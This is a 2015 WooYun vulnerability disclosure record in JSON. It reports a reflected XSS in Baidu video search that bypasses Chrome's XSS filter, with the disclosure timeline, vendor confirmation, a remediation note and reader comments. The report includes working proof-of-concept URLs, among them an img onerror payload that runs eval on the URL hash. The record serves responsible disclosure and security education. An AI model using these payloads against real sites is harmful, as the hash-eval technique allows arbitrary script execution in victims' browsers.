{"id": 16367, "wybug_id": "wooyun-2015-0117712", "wybug_title": "百度搜索反射型跨站（无视chrome xss filter）", "wybug_corp": "百度", "wybug_author": "香草", "wybug_date": "2015-06-02 14:46", "wybug_open_date": "2015-07-17 15:12", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向公众公开  简要描述： 感觉好久没发了，顺手发给百度搜索的吧，这个地方是我第三次发现问题了，希望这次能修好 详细说明：  视频搜索，以前被我报过两次，貌似还没修复好 WooYun: 百度搜索反射型跨站第一弹（无视浏览器xss filter）  WooYun: 百度搜索反射型跨站第二弹 百度视频搜索时候,直接搜索，当然过滤的很好，没有任何问题\nhttp://v.baidu.com/v?word=zz%22%3E%3Cimg%20src=x%3Exxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800&ie=utf-8#order=1&sc=4&pn=0\n\n\n但是，我手贱把链接中的#换成&之后呢？\nhttp://v.baidu.com/v?word=zz%22%3E%3Cimg%20src=x%3Exxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800&ie=utf-8&order=1&sc=4&pn=0\n万万没想到\n\n弹个框试试\nhttp://v.baidu.com/v?word=xss%22%3E%3Cimg/src=%22%22+onerror=eval(location.hash.slice(1))//%3Exxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800&ie=gbk&order=1&sc=8&pn=0#alert(1)\n\n\n为什么没有被chrome的filter拦截呢，大家且看生成的代码\n\n百度自己的xss filter把 \" 转换成了 \\\",让我可以轻松的绕过chrome filter现在漏洞成因很明显了，在html环境使用了javascript转义过滤方式导致了漏洞产生，顺便帮助我们绕过了浏览器filter。至于如何绕过IE就不赘述了   漏洞证明：  弹个框试试\nhttp://v.baidu.com/v?word=xss%22%3E%3Cimg/src=%22%22+onerror=eval(location.hash.slice(1))//%3Exxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800&ie=gbk&order=1&sc=8&pn=0#alert(1)\n\n\n   修复方案：  在正确的地方使用正确的编码   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-06-02 15:11 厂商回复： 谢交已提 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-02 14:50 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  玩的一手好XSS    \n     2015-06-02 15:30 |    \t\twusuopubupt \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | BUPTer, linux lover.)\t\t \n  学习了。    \n     2015-06-02 16:14 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @wusuopubupt 你能看到详情    \n     2015-06-03 10:18 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @香草 他学习了标题- -    \n     2015-07-17 15:39 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手上路。)\t\t \n  那么看不起IE    \n     2015-07-17 17:33 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @幻老头儿 哪有看不起IE了啊    \n     2015-07-18 10:39 |    \t\txssshell \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | xssshell)\t\t \n  xss大神们 有没有共享一下你们的xss的payload    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}